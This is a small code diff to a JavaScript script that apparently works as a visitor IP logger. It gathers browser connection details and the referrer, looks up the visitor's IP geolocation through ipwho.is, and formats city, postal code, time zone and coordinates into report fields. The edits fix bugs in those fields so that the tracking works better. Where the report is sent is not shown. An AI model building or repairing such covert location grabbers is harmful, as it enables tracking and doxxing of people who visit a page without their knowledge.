@@ -19,7 +19,7 @@ var rtt = navigator.connection.rtt
 var ebwidth = navigator.connection.type
 var effectiveType = navigator.connection.effectiveType
 var refer = document.referrer
-var orientation = screen.orientation
+var orientation = screen.orientation.type
 
 $.getJSON("https://ipwho.is/", function(data) {         
   var params = {
@@ -36,7 +36,7 @@ $.getJSON("https://ipwho.is/", function(data) {
           },
           {
             "name": "GeoLocation Info",
-            "value": `>>> Town, State: ${data.city}, ${data.region}\nRegion: ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTime Zone: ${data.timezone.current_time}, ${data.timezone.offset}, ${data.id}, ${data.abbr}\nLong/Lat: ${data.latitude}, ${data.longitude}`
+            "value": `>>> Town, State: ${data.city}, ${data.region}\nRegion: ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTime Zone: ${data.timezone.current_time}, ${data.timezone.offset}, ${data.timezone.id}, ${data.timezone.abbr}\nLong/Lat: ${data.latitude}, ${data.longitude}`
           },
           {
             "name": "Network Info",
@@ -68,3 +68,4 @@ $.getJSON("https://ipwho.is/", function(data) {
     console.log(res);
   }) 
 })
+
